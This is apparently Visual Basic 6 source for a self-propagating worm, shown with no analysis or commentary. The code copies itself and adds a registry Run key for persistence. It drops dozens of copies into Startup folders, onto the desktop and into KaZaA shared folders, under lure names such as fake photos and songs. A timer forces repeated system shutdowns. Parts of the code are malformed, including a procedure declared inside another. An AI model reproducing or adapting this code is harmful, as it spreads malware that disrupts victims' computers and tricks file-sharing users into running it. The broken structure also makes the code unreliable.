Private Sub Form_Load()
   strFile = App.Path & "\" & App.EXEName & ".exe"
   If Command() = vbNullString Then
       FileCopy strFile, strNewFile
       WriteToRegistry
       Shell strNewFile & " \brainwash29", vbHide
       
       Private Sub WriteToRegistry()
   Dim objReg As Object
   Set objReg = CreateObject("wscript.shell")
   objReg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & strProjectName, strNewFile & " \brainwash29"

   FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\BrainwashBrainwashBrainwash45.exe"
   FileCopy App.Path + "\" & App.EXEName + ".exe", "C:\Windows\Start Menu\Programs\Startup\1q2w3e4r5t.exe"
   FileCopy App.Path + "\" & App.EXEName + ".exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\drh45ty45y45.exe"
   FileCopy App.Path + "\" & App.EXEName + ".exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\344urtjrty54.exe"
   FileCopy App.Path + "\" & App.EXEName + ".exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\brainwashbrainwashbrainwash45.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\the_real_deal.jpg"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\sdkgero.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\burger.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\makingadifferencedaily.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\wibblewobbleyumyum.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\feeding_frenzy.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\onitsway.VBS"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\BRAINWASH,BRAINWASH,BRAINWASH45.JPG"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA Lite\My Shared Folder\me_naked.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA Lite\My Shared Folder\hiya.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\My Pictures\Jumbo Sausages\p0o9i8u7y6t5r4e3w2q1.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\EIT43594855J5855N5.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA Lite\My Shared Folder\SClub7krew.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\My_new_cam.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA Lite\My Shared Folder\hi ya.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\Me!!.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\showerpic.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\SWEV_FIRST_SONG.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\SWEV - Execution.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\SWEV-SWEV.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\this-is-something-or-nothing.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\The White Stripes - IM INFECTED.mp3"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Windows\Cups32.jpg"
End Sub

Private Sub Timer1_Timer()
   MsgBox "pacifier pacifies, yeah it pacifies"
   Shell "Shutdown.exe -s", vbMaximizeFocus - r
   Shell "rundll32.exe user.exe,exitwindows"
End Sub
